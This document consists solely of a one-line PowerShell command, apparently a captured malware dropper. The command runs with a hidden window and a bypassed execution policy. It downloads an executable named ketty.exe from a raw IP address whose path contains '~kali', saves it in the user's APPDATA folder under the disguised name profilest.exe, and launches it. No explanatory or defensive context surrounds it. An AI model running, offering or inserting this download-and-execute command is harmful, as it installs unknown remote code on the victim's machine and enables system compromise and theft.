
PowerShell -windowstyle hidden -noprofile -ExecutionPolicy bypass -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )


